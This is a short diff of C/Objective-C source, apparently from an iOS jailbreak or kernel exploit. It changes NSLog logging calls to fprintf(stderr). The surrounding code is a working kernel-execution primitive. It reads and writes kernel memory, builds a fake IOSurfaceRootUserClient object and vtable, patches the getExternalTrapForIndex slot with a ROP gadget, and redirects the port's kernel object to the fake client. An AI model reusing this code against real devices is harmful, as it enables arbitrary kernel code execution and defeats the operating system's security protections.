@@ -21,7 +21,7 @@ mach_port_t prepare_user_client(void) {
     exit(EXIT_FAILURE);
   }
 
-  NSLog(@"got user client: 0x%x", user_client);
+  fprintf(stderr, "got user client: 0x%x \n", user_client);
   return user_client;
 }
 
@@ -41,9 +41,9 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
         IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject);
         IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
     
-        NSLog(@"IOSurfaceRootUserClient_port: %llx", IOSurfaceRootUserClient_port);
-        NSLog(@"IOSurfaceRootUserClient_addr: %llx", IOSurfaceRootUserClient_addr);
-        NSLog(@"IOSurfaceRootUserClient_vtab: %llx", IOSurfaceRootUserClient_vtab);
+        fprintf(stderr, "IOSurfaceRootUserClient_port: %llx \n", IOSurfaceRootUserClient_port);
+        fprintf(stderr, "IOSurfaceRootUserClient_addr: %llx \n", IOSurfaceRootUserClient_addr);
+        fprintf(stderr, "IOSurfaceRootUserClient_vtab: %llx \n", IOSurfaceRootUserClient_vtab);
     }
     
     static uint64_t fake_vtable = 0;
@@ -51,28 +51,28 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
     
     if (!(fake_vtable && fake_client)) {
         fake_vtable = kalloc(0x1000);
-        NSLog(@"Created fake_vtable at %016llx", fake_vtable);
+        fprintf(stderr, "Created fake_vtable at %016llx \n", fake_vtable);
         
         for (int i = 0; i < 0x200; i++) {
             wk64(fake_vtable + i * 8, rk64(IOSurfaceRootUserClient_vtab + i * 8 ));
         }
         
-        NSLog(@"Copied some of the vtable over");
+        fprintf(stderr, "Copied some of the vtable over \n");
         
         fake_client = kalloc(0x1000);
-        NSLog(@"Created fake_client at %016llx", fake_client);
+        fprintf(stderr, "Created fake_client at %016llx \n", fake_client);
         
         for (int i = 0; i < 0x200; i++) {
             wk64(fake_client + i * 8, rk64(IOSurfaceRootUserClient_addr + i * 8));
         }
         
-        NSLog(@"Copied the user client over");
+        fprintf(stderr, "Copied the user client over \n");
         
         wk64(fake_client, fake_vtable);
         
         wk64(fake_vtable + 8 * 0xB7, find_add_x0_x0_0x40_ret());
         
-        NSLog(@"Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
+        fprintf(stderr, "Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex \n");
     }
     
     wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
